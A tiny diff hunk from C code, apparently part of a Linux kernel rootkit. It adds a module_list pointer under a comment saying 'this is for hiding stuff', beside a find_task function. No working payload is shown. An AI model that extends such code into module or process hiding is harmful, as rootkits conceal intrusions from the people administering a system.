@@ -59,6 +59,7 @@ psize **find(void) {
 
 
 // --------------------------------this is for hiding stuff
+struct list_head *module_list; 
 struct task_struct *
 find_task(pid_t pid)
 {
